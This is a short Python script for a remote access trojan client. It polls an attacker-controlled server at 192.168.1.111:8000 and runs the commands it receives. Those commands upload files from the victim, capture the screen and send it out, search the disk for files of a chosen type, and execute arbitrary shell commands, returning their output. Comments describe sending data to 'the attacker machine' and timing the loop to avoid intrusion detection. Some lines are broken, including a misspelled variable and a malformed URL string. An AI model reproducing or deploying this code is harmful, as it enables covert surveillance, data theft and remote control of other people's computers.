#!/usr/bin/python

import requests
import subprocess # shell management
import time
import tempfile # temp directory library
import shutil # file operations library
import os

from PIL import ImageGrab # Image processing library

while True:
    req = requests.get('http://192.168.1.111:8000')
    command = req.text # request body

    if 'terminate' in command:
        break # this will break the loop

    elif 'grab' in command:
        grab,path = command.split(' -f ') # splitting the flag for the file
        if os.path.exists(path):
            url = 'http://192.168.1.111:8000/store' # POST url to send file
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.1.111:8000', data='[-] Not able to find the file')

    elif 'screencap' in command:
        # creating a temp directory (AppData\Local\Temp)
        dirpath = tempfile.mkdtemp()
        # grabbing target image with Pillow
        ImageGrab.grab().save(dirpath + '\image.jpg','JPEG') # taking and formatting snapshot
        url = 'http://192.168.1.111:8000/store'
        files = {'file': open(dirpath + "\image.jpg", 'rb')}
        r = requests.post(url, files=files) # post to the attacker machine
        # closing file for avoid deletion of a current image
        files['file'].close()
        # deleting temp folder
        shutil.rmtree(dirpath)

    elif 'search' in command:
        command = command[7:] # getting the directory route
        path,ext = commmand.split(" -filetype ") # split interval
        list = ''
        for dirpath, dirname, files in os.walk(path): # looping OS for path, name and files
            for file in files: # check file lists
                if file.endswith(ext): # here we evaluates file extensions
                    list = list + '\n' + os.path.join(dirpath, file) # adding items to a multi-line string
        requests.post(url=''http://192.168.1.111:8000/', data=list) # posting the result

    else:
        CMD = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        post_response = requests.post(url="http://192.168.1.111:8000", data=CMD.stdout.read())
        post_response = requests.post(url="http://192.168.1.111:8000", data=CMD.stderr.read())

    # 3 seg cycle - avoiding IDS
    time.sleep(3)
